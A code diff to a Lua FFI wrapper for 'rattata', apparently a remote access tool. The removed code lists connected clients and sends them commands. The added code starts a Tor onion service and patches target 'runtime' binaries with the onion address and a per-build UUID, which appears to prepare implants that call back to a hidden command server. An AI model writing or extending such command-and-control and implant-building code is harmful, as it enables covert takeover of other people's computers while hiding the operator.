@@ -3,51 +3,51 @@ local ffi = require("ffi")
 local f_rattata = ffi.load("rattata")
 
 ffi.cdef[[
-  typedef struct Rattata {
-    const char *hostname;
-    uint16_t clients[255];
-    uint16_t port;
-    const void *threads;
-  } Rattata;
-
-  typedef struct Client {
-    uint16_t id;
-    const char *ip;
-    const char *os;
-    const char *arch;
-  } Client;
-
-  struct Rattata *rattata_new(uint16_t port);
-  void rattata_free(struct Rattata *ptr);
-  const char *rattata_command(struct Rattata *ptr, uint16_t client_id, const char *command, const char *args);
-  struct Client *rattata_info(struct Rattata *ptr, uint16_t client_id);
+  const int8_t* ffi_location(void);
+  const int8_t* ffi_hostname(void);
+  const int16_t ffi_start(int16_t port);
+  const int16_t ffi_choose_port();
 ]]
+
+-- get a uuid
+local function uuid()
+    local template ='xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'
+    return string.gsub(template, '[xy]', function (c)
+        local v = (c == 'x') and math.random(0, 0xf) or math.random(8, 0xb)
+        return string.format('%x', v)
+    end)
+end
 
 local rattata = {}
 
--- start a server on a specific port
-function rattata:new(port)
-  local o = {}
-  setmetatable(o, self)
-  self.__index = self
-  self.pointer = f_rattata.rattata_new(port or 0)
-  return o
+-- get the current setings dir (which has tor stuff in it)
+function rattata:location()
+  return ffi.string(f_rattata.ffi_location())
 end
 
--- stop running server
-function rattata:free()
-  f_rattata.rattata_free(self.pointer)
+-- get the current onion-hostname from running tor-server
+function rattata:hostname()
+  return ffi.string(f_rattata.ffi_hostname())
 end
 
--- send a command to a specific client
-function rattata:command(clientID, command, args)
-  return f_rattata.rattata_command(self.pointer, clientID, command, args)
+-- start a tor server & the local service connected to it
+function rattata:start(port)
+  return f_rattata.ffi_start(port)
 end
 
--- get info about a specific client
-function rattata:info(clientID)
-  -- TODO: need to convert types here
-  return f_rattata.rattata_info(self.pointer, clientID)
+-- choose a free port
+function rattata:choose_port()
+  return f_rattata.ffi_choose_port()
+end
+
+
+-- given a platform's target runtime filename path, get the target runtime (as a string) for current manager instance
+function rattata:runtime(runtime_filename, port)
+  local fin = io.open(runtime_filename, "rb")
+  local contents = fin:read("*all")
+  fin:close()
+  local c = contents:gsub("ONION_ADDRESS.............................................................", string.format("ONION_ADDRESS%-61s", string.format("%s:%d", self:hostname(), port)))
+  return c:gsub("MY_UUIID....................................", string.format("MY_UUIID%s", uuid()))
 end
 
 return rattata
